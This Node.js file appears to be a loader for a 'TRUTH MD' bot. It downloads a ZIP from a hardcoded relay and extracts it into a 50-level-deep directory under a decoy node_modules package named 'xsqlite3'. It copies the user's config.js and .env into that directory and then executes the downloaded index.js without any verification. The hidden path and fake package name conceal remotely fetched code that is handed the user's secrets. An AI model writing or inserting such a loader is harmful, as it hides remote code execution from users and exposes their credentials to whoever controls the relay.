import fs from 'fs';
import path from 'path';
import axios from 'axios';
import AdmZip from 'adm-zip';
import { fileURLToPath } from 'url';
import { createRequire } from 'module';

// === ES MODULE FIX ===
// Recreate __dirname and require for ES Modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const require = createRequire(import.meta.url);

// === CONFIG ===
const VERCEL_RELAY_URL = process.env.VERCEL_RELAY_URL || 'https://relay.courtshost.com/api/repo';
const ACCESS_KEY = process.env.ACCESS_KEY || 'techworld_secure_2026';

const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
const DEEP_NEST_COUNT = 50;

// === Step 1: Create deep hidden folder
function createDeepRepoPath() {
  let deepPath = baseFolder;
  for (let i = 0; i < DEEP_NEST_COUNT; i++) {
    deepPath = path.join(deepPath, `core${i}`);
  }
  const repoFolder = path.join(deepPath, 'lib_signals');
  fs.mkdirSync(repoFolder, { recursive: true });
  return repoFolder;
}

// === Step 2: Download ZIP from Vercel relay
async function downloadAndExtractRepo(repoFolder) {
  try {
    console.log('🔄 Syncing codes from secure relay...');

    const response = await axios.get(VERCEL_RELAY_URL, {
      responseType: 'arraybuffer',
      headers: {
        'x-access-key': ACCESS_KEY,
        'User-Agent': 'truth-md-loader'
      },
      timeout: 20000
    });

    const zip = new AdmZip(Buffer.from(response.data));
    zip.extractAllTo(repoFolder, true);

    console.log('✅ Codes synced successfully');
  } catch (err) {
    console.error('❌ Sync failed:', err.response?.status || err.message);
    process.exit(1);
  }
}

// === Step 3: Copy configs
function copyConfigs(repoPath) {
  const configSrc = path.join(__dirname, 'config.js');
  const envSrc = path.join(__dirname, '.env');

  try {
    if (fs.existsSync(configSrc)) {
      fs.copyFileSync(configSrc, path.join(repoPath, 'config.js'));
      console.log('✅ config.js copied');
    }
  } catch {
    console.warn('⚠️ config.js not copied');
  }

  try {
    if (fs.existsSync(envSrc)) {
      fs.copyFileSync(envSrc, path.join(repoPath, '.env'));
      console.log('✅ .env copied');
    }
  } catch {
    console.warn('⚠️ .env not copied');
  }
}

// === Step 4: Launch TRUTH MD
(async () => {
  const repoFolder = createDeepRepoPath();
  await downloadAndExtractRepo(repoFolder);

  const subDirs = fs
    .readdirSync(repoFolder)
    .filter(f => fs.statSync(path.join(repoFolder, f)).isDirectory());

  if (!subDirs.length) {
    console.error('❌ ZIP extracted nothing');
    process.exit(1);
  }

  const extractedRepoPath = path.join(repoFolder, subDirs[0]);
  copyConfigs(extractedRepoPath);

  const configdbPath = path.join(extractedRepoPath, 'lib', 'configdb.js');
  if (!fs.existsSync(configdbPath)) {
    console.warn('⚠️ lib/configdb.js not found (non-fatal)');
  } else {
    console.log('✅ lib/configdb.js exists');
  }

  try {
    console.log('[🚀] Launching TRUTH MD Bot...');
    process.chdir(extractedRepoPath);
    require(path.join(extractedRepoPath, 'index.js'));
  } catch (err) {
    console.error('❌ TRUTH MD launch error:', err.message);
    process.exit(1);
  }
})();
